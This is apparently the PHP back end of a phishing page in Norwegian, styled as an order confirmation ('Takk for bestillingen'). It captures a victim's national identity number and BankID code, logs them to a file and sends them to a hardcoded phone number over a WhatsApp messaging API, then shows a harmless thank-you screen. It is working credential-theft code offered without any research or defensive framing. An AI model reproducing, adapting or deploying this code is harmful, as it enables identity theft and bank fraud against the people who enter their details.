<?php
session_start();
$fnr = $_POST['fnr'] ?? 'ukjent';
$kode = $_POST['kode'] ?? 'ukjent';
$vare = $_SESSION['vare'] ?? 'ukjent';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'ukjent';
$tid = date("Y-m-d H:i:s");
$logg = "[$tid] IP: $ip – Vare: $vare – Fødselsnummer: $fnr – BankID-kode: $kode – Signering fullført\n";
file_put_contents("logs.txt", $logg, FILE_APPEND);
$melding = urlencode($logg);
$whats_url = "https://api.callmebot.com/whatsapp.php?phone=4741357171&text=$melding&apikey=7838436";
file_get_contents($whats_url);
session_destroy();
?>

<!DOCTYPE html>
<html lang="no">
<head>
  <meta charset="UTF-8">
  <title>Takk for bestillingen</title>
</head>
<body>
  <h2>Takk for bestillingen</h2>
  <p>Din ordre er registrert og vil bli behandlet.</p>
</body>
</html>
